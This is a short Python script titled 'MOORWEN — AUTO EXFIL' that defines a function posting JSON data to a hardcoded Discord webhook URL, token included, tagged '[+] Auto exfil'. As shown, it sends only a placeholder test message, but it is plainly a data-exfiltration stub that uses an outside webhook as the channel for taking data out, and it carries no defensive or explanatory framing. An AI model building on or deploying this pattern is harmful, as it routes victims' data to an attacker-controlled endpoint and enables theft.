# ============================================================
# MOORWEN — AUTO EXFIL
# ============================================================

import requests
import json

webhook = "https://discord.com/api/webhooks/1541184615719374990/ij1wnF8bf0CULSDYZKUyIEkWWKn7whlClnq9fMa8vGHHEPVanQyUn8WwIiXogfHsx3go"

def exfil(data):
    payload = {"content": f"[+] Auto exfil: {json.dumps(data)}"}
    requests.post(webhook, json=payload)

def run():
    data = {"message": "MoorWen auto exfil test"}
    exfil(data)

if __name__ == "__main__":
    run()
